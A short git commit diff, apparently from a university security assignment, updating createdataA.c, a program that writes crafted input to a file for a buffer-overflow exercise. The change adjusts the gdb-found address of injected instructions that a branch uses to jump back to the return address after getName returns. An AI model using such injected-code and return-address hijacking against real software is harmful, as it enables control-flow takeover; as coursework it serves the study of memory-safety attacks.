0c8aafd58ff2dda59fa2f369e175bff8aacaeb57
Jeonghyun Shin <js9523@princeton.edu>
2024-12-09 19:02:39 -0500

    instruction address update

--- createdataA.c
+++ createdataA.c
@@ -44,8 +44,8 @@ int main() {
 
     /* B back to return address */ 
     /* 0x40087c is instruction address after getName returns
-    0xffffffffea00 is the injected instruction address based on gdb */
-    B = MiniAssembler_b(0x40087c, 0xffffffffea00);
+    0xffffffffea20 is the injected instruction address based on gdb */
+    B = MiniAssembler_b(0x40087c, 0xffffffffea20);
     fwrite(&B, sizeof(unsigned int), 1, file);
 
     fclose(file);
